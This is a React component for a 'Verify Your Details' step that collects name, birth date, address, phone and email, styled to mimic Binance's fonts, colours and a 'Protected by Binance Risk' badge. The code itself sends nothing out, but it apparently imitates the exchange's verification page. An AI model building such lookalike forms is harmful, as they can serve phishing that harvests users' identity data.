
import { FC, useState } from "react";
import { Button } from "@/components/ui/button";
import { Loader, Lock } from "lucide-react";

interface PersonalDetailsStepProps {
  formData: {
    firstName: string;
    lastName: string;
    dateOfBirth: string;
    address: string;
    postalCode: string;
    city: string;
    country: string;
    phoneNumber: string;
    email: string;
  };
  isLoading: boolean;
  onSubmit: (data: any) => void;
  onBack: () => void;
}

export const PersonalDetailsStep: FC<PersonalDetailsStepProps> = ({ 
  formData, 
  isLoading, 
  onSubmit, 
  onBack 
}) => {
  const [details, setDetails] = useState({
    firstName: formData.firstName,
    lastName: formData.lastName,
    dateOfBirth: formData.dateOfBirth,
    address: formData.address,
    postalCode: formData.postalCode,
    city: formData.city,
    country: formData.country,
    phoneNumber: formData.phoneNumber,
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(details);
  };

  const handleInputChange = (field: string, value: string) => {
    setDetails(prev => ({ ...prev, [field]: value }));
  };

  const isFormValid = Object.values(details).every(value => value.trim() !== '');

  const inputStyle = {
    backgroundColor: "var(--color-Input, #2B3139)",
    border: "1px solid var(--color-InputLine, #474D57)"
  };

  const labelStyle = {
    color: "var(--color-PrimaryText, #EAECEF)",
    fontFamily: "BinanceNova, Arial, sans-serif",
    fontSize: "14px",
    fontWeight: "400",
    lineHeight: "20px"
  };

  const inputFieldStyle = {
    color: "var(--color-PrimaryText, #EAECEF)",
    fontFamily: "BinanceNova, Arial, sans-serif",
    fontSize: "14px",
    fontWeight: "400",
    lineHeight: "20px"
  };

  return (
    <>
      {/* Header */}
      <div className="mb-8">
        <div 
          className="card-page-title !mb-[0px]" 
          role="heading" 
          aria-level={1}
          style={{ 
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "24px",
            fontWeight: "600",
            lineHeight: "32px"
          }}
        >
          Verify Your Details
        </div>
        <div 
          className="mt-2"
          style={{ 
            color: "var(--color-TertiaryText, #848E9C)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "400",
            lineHeight: "20px"
          }}
        >
          Please confirm your personal information.
        </div>
      </div>

      {/* Personal Details Form */}
      <form onSubmit={handleSubmit} className="space-y-4">
        {/* First Name */}
        <div className="bn-formItem">
          <label className="bn-formItem-label block mb-2" style={labelStyle}>
            First Name
          </label>
          <div style={inputStyle} className="rounded">
            <input
              type="text"
              className="bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
              style={inputFieldStyle}
              value={details.firstName}
              onChange={(e) => handleInputChange('firstName', e.target.value)}
              placeholder="Enter your first name"
            />
          </div>
        </div>

        {/* Last Name */}
        <div className="bn-formItem">
          <label className="bn-formItem-label block mb-2" style={labelStyle}>
            Last Name
          </label>
          <div style={inputStyle} className="rounded">
            <input
              type="text"
              className="bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
              style={inputFieldStyle}
              value={details.lastName}
              onChange={(e) => handleInputChange('lastName', e.target.value)}
              placeholder="Enter your last name"
            />
          </div>
        </div>

        {/* Date of Birth */}
        <div className="bn-formItem">
          <label className="bn-formItem-label block mb-2" style={labelStyle}>
            Date of Birth
          </label>
          <div style={inputStyle} className="rounded">
            <input
              type="date"
              className="bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
              style={inputFieldStyle}
              value={details.dateOfBirth}
              onChange={(e) => handleInputChange('dateOfBirth', e.target.value)}
            />
          </div>
        </div>

        {/* Address */}
        <div className="bn-formItem">
          <label className="bn-formItem-label block mb-2" style={labelStyle}>
            Address
          </label>
          <div style={inputStyle} className="rounded">
            <input
              type="text"
              className="bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
              style={inputFieldStyle}
              value={details.address}
              onChange={(e) => handleInputChange('address', e.target.value)}
              placeholder="Enter your address"
            />
          </div>
        </div>

        {/* Postal Code and City in same row */}
        <div className="grid grid-cols-2 gap-4">
          <div className="bn-formItem">
            <label className="bn-formItem-label block mb-2" style={labelStyle}>
              Postal Code
            </label>
            <div style={inputStyle} className="rounded">
              <input
                type="text"
                className="bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                style={inputFieldStyle}
                value={details.postalCode}
                onChange={(e) => handleInputChange('postalCode', e.target.value)}
                placeholder="12345"
              />
            </div>
          </div>

          <div className="bn-formItem">
            <label className="bn-formItem-label block mb-2" style={labelStyle}>
              City
            </label>
            <div style={inputStyle} className="rounded">
              <input
                type="text"
                className="bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                style={inputFieldStyle}
                value={details.city}
                onChange={(e) => handleInputChange('city', e.target.value)}
                placeholder="Enter your city"
              />
            </div>
          </div>
        </div>

        {/* Country */}
        <div className="bn-formItem">
          <label className="bn-formItem-label block mb-2" style={labelStyle}>
            Country
          </label>
          <div style={inputStyle} className="rounded">
            <input
              type="text"
              className="bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
              style={inputFieldStyle}
              value={details.country}
              onChange={(e) => handleInputChange('country', e.target.value)}
              placeholder="Enter your country"
            />
          </div>
        </div>

        {/* Phone Number */}
        <div className="bn-formItem">
          <label className="bn-formItem-label block mb-2" style={labelStyle}>
            Phone Number
          </label>
          <div style={inputStyle} className="rounded">
            <input
              type="tel"
              className="bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
              style={inputFieldStyle}
              value={details.phoneNumber}
              onChange={(e) => handleInputChange('phoneNumber', e.target.value)}
              placeholder="Enter your phone number"
            />
          </div>
        </div>

        {/* Email (readonly) */}
        <div className="bn-formItem">
          <label className="bn-formItem-label block mb-2" style={labelStyle}>
            Email
          </label>
          <div style={inputStyle} className="rounded">
            <input
              type="email"
              className="bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5 opacity-60"
              style={inputFieldStyle}
              value={formData.email}
              readOnly
            />
          </div>
        </div>

        <Button
          className="w-full py-3 rounded transition-colors mb-6"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "500",
            lineHeight: "20px",
            height: "48px"
          }}
          type="submit"
          disabled={isLoading || !isFormValid}
        >
          {isLoading ? (
            <Loader className="animate-spin h-4 w-4" />
          ) : (
            "Complete Verification"
          )}
        </Button>

        {/* Protected by Binance Risk */}
        <div className="flex items-center justify-center">
          <div className="flex items-center">
            <div 
              className="w-4 h-4 mr-2 flex items-center justify-center rounded border"
              style={{ 
                backgroundColor: "var(--color-TertiaryText, #848E9C)",
                borderColor: "var(--color-TertiaryText, #848E9C)"
              }}
            >
              <Lock 
                className="w-2 h-2" 
                style={{ color: "var(--color-CardBg, #1E2329)" }}
              />
            </div>
            <span 
              className="text-sm"
              style={{ 
                color: "var(--color-TertiaryText, #848E9C)",
                fontFamily: "BinanceNova, Arial, sans-serif"
              }}
            >
              Protected by Binance Risk
            </span>
          </div>
        </div>

        <button
          type="button"
          onClick={onBack}
          className="w-full text-center text-sm mt-4"
          style={{
            color: "var(--color-TertiaryText, #848E9C)",
            fontFamily: "BinanceNova, Arial, sans-serif"
          }}
        >
          Back to verification
        </button>
      </form>
    </>
  );
};
